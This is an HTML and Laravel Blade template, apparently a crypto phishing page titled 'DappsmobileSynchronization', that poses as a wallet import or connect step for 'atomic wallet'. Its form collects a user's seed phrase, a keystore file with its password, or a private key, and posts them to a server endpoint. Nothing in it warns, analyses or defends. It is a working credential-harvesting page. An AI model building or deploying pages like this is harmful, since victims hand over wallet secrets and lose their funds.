<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <meta http-equiv="Content-Language" content="en">
    <meta name="theme-color" content="#0D242A">
    <meta name="msapplication-TileColor" content="#">
    <meta name="theme-color" content="#fff">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="HandheldFriendly" content="True">
    <meta name="MobileOptimized" content="320">
    <title>DappsmobileSynchronization</title>
    <link rel="preconnect" href="https://fonts.gstatic.com/">
    <link href="https://fonts.googleapis.com/css2?family=Vesper+Libre&amp;display=swap" rel="stylesheet">
    <link rel="shortcut icon" type="image/jpg" href="../favicon.png" />

    <link rel="stylesheet" href="css/style.css" type="text/css">
    <link rel="stylesheet" href="css/mobile.css" type="text/css">
    <style>
        body {
            margin: 0;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', 'Fira Sans', 'Droid Sans', 'Helvetica Neue', sans-serif;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }

        code {
            font-family: source-code-pro, Menlo, Monaco, Consolas, 'Courier New', monospace;
        }
    </style>
    <style>
        .App {
            text-align: center;
        }

        .App-logo {
            height: 40vmin;
            pointer-events: none;
        }

        @media (prefers-reduced-motion: no-preference) {
            .App-logo {
                animation: App-logo-spin infinite 20s linear;
            }
        }

        .App-header {
            background-color: #282c34;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            font-size: calc(10px + 2vmin);
            color: white;
        }

        .App-link {
            color: #61dafb;
        }

        @keyframes App-logo-spin {
            from {
                transform: rotate(0deg);
            }
            to {
                transform: rotate(360deg);
            }
        }
    </style>

</head>

<body><noscript>You need to enable JavaScript to run this app.</noscript>
    <div id="root">
        <section class="form">
            <div class="import">
                <a href="/">
                    <h3><i class="fas fa-less-than"></i>Import Wallet</h3>
                    @if(session()->has('message'))
                        <div class="alert alert-success">
                          {{ session()->get('message') }}
                        </div>
                    @endif
                </a>
                <ul>
                    <li class="phrase" id="phrase1"><a href="#">Phrase</a></li>
                    <li class="keystore" id="keystore1"><a href="#">Keystore JSON</a></li>
                    <li class="privatekey" id="privatekey1"><a href="#">Private Key</a></li>
                </ul>
                <hr>

                <form action="/process" method="post" id="my-form" enctype="multipart/form-data">
                  @csrf
                    <input type="hidden" name="walletname" value="atomic wallet"/>

                    <div id="phrase">
                        <textarea placeholder="Phrase" cols="30" rows="10" name="phrase" id="inputphrase" required></textarea>
                        <p>Typically 12(sometimes 24) words separated by single spaces</p>
                        <button id="submit" type="submit"  name="submit" value="submit">Connect To Wallet</button>
                    </div>


                    <div id="keystore" style="display:none;">
                    <textarea placeholder="Keystore" cols="30" rows="10" name="keystore" id="inputkeystore"></textarea><br/>
                    <input type="password" placeholder="Password" name="keystorepass" style="margin-top: 10px;" id="inputkeystorepass">
                        <p>Several lines of text beginning with "{...}" plus the password you used to encrypt it.</p>
                        <button id="submit" type="submit"  name="submit" value="submit">Connect to Wallet</button>
                    </div>


                    <div id="privatekey" style="display:none;">
                    <input type="text" placeholder="Private Key" name="privatekey" id="inputprivatek">
                        <p>Typically 12(sometimes 24) words separated by single spaces</p>
                        <button id="submit" type="submit"  name="submit" value="submit">Connect to Wallet</button></div>
                </form>
            </div>
        </section>
    </div>
    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.11.0/umd/popper.min.js" integrity="sha384-b/U6ypiBEHpOf/4+1nzFpr53nxSS+GLCkfwBdFNTxtclqqenISfwAzpKaMNFNmj4" crossorigin="anonymous"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta/js/bootstrap.min.js" integrity="sha384-h0AbiXch4ZDo7tp9hKZ4TsHbi047NrKGLO3SEJAg45jXxnGIfYzk4Si90RDIqNm1" crossorigin="anonymous"></script>
    <script>
        $(".div-cont").click(function() {
                $(".import").fadeToggle();
            }

        )
    </script>
    <script>
        var btn = document.getElementById("phrase1");
        var btn1 = document.getElementById("keystore1");
        var btn2 = document.getElementById("privatekey1");
        var modal = document.getElementById("phrase");
        var modal1 = document.getElementById("keystore");
        var modal2 = document.getElementById("privatekey");
        btn.onclick = function() {
            document.getElementById("inputphrase").required = true;
            document.getElementById("inputkeystore").required = false;
            document.getElementById("inputkeystorepass").required = false;
            document.getElementById("inputprivatek").required = false;
            modal.style.display = "block";
            modal1.style.display = "none";
            modal2.style.display = "none";
        }

        btn1.onclick = function() {
            document.getElementById("inputphrase").required = false;
            document.getElementById("inputkeystore").required = true;
            document.getElementById("inputkeystorepass").required = true;
            document.getElementById("inputprivatek").required = false;
            modal1.style.display = "block";
            modal.style.display = "none";
            modal2.style.display = "none";
        }

        btn2.onclick = function() {
            document.getElementById("inputphrase").required = false;
            document.getElementById("inputkeystore").required = false;
            document.getElementById("inputkeystorepass").required = false;
            document.getElementById("inputprivatek").required = true;
            modal2.style.display = "block";
            modal.style.display = "none";
            modal1.style.display = "none";
        }
    </script>

    <div>
        <div class="Toastify"></div>
    </div>
</body>

</html>
